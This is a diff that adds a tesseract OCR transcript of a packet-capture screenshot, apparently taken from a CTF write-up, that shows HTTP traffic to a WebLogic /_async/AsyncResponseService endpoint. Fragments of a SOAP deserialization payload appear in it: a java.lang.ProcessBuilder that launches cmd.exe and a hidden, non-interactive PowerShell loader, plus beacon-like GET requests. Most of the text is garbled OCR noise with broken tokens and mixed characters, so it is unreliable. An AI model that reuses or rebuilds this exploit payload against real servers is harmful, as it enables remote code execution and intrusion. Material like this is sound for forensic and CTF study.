@@ -1,0 +1,66 @@
+# OCR: a573a9ea4f45d494547d025915f76ae4.webp
+# 来源: .\02-WriteUp\2025\a573a9ea4f45d494547d025915f76ae4.webp
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-09-01 22:34
+
+sn
+2 HO) Q BRIG) HARI) 3W4 EHS) HED OW) TRC) eMC
+万 目 匹 @ mRhO Ce oetreRB 国 & & 史 国 国
+Time Source Protocol Lengtt info
+15718 363.867968__192.168.111. 168. HTTP/ XL POST /_async/AsyncResponseService HTTP/1.1
+970486 5 168.111. HTTP/1.1 262 Accepted
+638219 (GET /gSNEREWSTHFYS1n3MAaNSANi2F6zndeysRLNSROGRLSST-9 HTTP/1.2
+754339 HTTP/1.1 289 OK
+GET. /gSWSRWSTHFYS1 n3MAeN7ARHKCImcWuA-nAT-A@aW}#6Qu-DéPon3nLFGXTESNSSQSWuFF/ n
+HTTP/1.1 209 OK
+65 /g5NER8WSTHFY91n3MAeN7AHHKCImcWuA-nAL-A@AW}#6QSu-DdPon3nLFGXTgSNSSQsvwFF/ ri
+HTTP/1.1 200 Ok
+400371 5 E POST /gSN6REWSTHFYSInSMAaN7AHHkCIMchUA-nAT-A@Abl}£6Q9w-DdPonSnL FGXTESNSSQswFF/ HTTP/1.2
+402823 5 168. HTTP/1.1 268 OK
+GET. /gSNEREWSTHFYS1n3MAaN7AMHKCTmcHuA-nAT-A@dW}*6QGu-DéPonnLFGXTgSNSSQsvuFF/ HTTP/1.1
+HTTP/1.1 289 Ok
+405968 GET. /gSNEREWSTHFYS1n3MAaN7AHHKCIMcWuA-nAT-A@aWj*6Q@u-DéPon3nLFGXTESNSSQsvWFF/ HTTP/1.2
+495195 2 HTTP/1.1 288 Ok
+<soapenviHeader> ice" >REB)SpEAVEHE
+Y <wsa:Action> 7 aderscus azAetion
+SeqJoSukQF1jIAtanti76 35 >Seq05u
+</wsa:Action> 2F tpsos
++ <usa:RelatesTo> 33 n
+3UAbTugaOguNiveUrgess 2 54 7 >2UAbTUg SOgUN
+r 2 E
+7 43 esTo>cwo rk:WorkC
+20 5 ontext etmr
+加 3 inttp: //bea-co
+i 团 11/2804/0 6/soap/w
+class="java. lang. ProcessBuilder"> ′ a E
+1 ` 2 elass="4 ava. lang
+class="java.lang.string” 国 E
+ength="3"> 团
+<void 6
+inde s 68
+> <string> s 85 78 3
+nd. exe 3 6d 64
+</string> 7s
+E 3d
+<void f
+inde 7
++ <string> zs ′ e p
+E 6 exe nop
+【 64 dd en -noni
+c 65 28 5 ( Dnerel
+a 2e eq 4){$b
+Sig 四 hell.exe
+7% c cn
+<string> E y eet
+[-] Powershelllvexe -nop\-w hidden -noni e "if([IntPtr]::Size -eq 4){Sb="powershell. exe’ }el¢ 7 \Windows Powershe
+</string> 30 11\v1.0\ powershe
+6 27 L.exe'} 3
+</array> ar 20 53 Object 5 ysten-Di
++ evoid s 兵 63 6 5.Proces
+method="start”/> 2 历 49 46 E
+D < ad 叶 b:$s.Arg
+Ppt aC day 75 3427, 24 6 26 6e ments=" -noni -n
+</soaneny:Header> “ Packet (1292 bytes) | Reassembled ICP (55/0 bytes) | Decoded UTF-8 text (5297 bytes)
+xmlns:work="http: //bea.con/2804/@6/soap/workarea/">
+<void
+© Bi. _ tag mitag), 5,046 byte(s) $318: 450428 - Displayed: 95162 (20.8%)
